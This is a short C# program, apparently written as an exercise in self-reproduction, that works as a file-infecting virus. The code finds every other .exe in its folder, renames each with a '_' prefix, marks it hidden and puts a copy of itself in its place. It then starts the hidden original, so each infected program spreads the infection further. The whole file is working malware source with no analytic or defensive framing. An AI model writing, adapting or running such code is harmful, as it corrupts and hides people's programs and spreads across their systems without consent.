using System;
using System.Diagnostics;
using System.IO;

namespace Self_reprodoction_program
{
    class Program
    {        
        static void Main(string[] args)
        {
            var currentDirectory = Directory.GetCurrentDirectory();
            var currentExecutingNameFile = System.Reflection.Assembly.GetExecutingAssembly().Location;

            //Найдем все exe файлы
            var exeFiles = Directory.GetFiles(currentDirectory, "*.exe");
            foreach (var file in exeFiles)
            {
                if (file == currentExecutingNameFile || Path.GetFileName(file)[0] == '_')
                {
                    continue;
                }
                //Console.WriteLine(file);
                var newFileName = Path.GetDirectoryName(file) + "/_" + Path.GetFileName(file);

                if (!File.Exists(newFileName))
                {
                    File.Move(file, newFileName);
                    File.SetAttributes(newFileName, FileAttributes.Hidden);
                    File.Copy(currentExecutingNameFile, file);
                }
            }
            var executeFile = Path.GetDirectoryName(currentExecutingNameFile) + "/_" + Path.GetFileName(currentExecutingNameFile);
            Process.Start(executeFile);
        }
    }
}
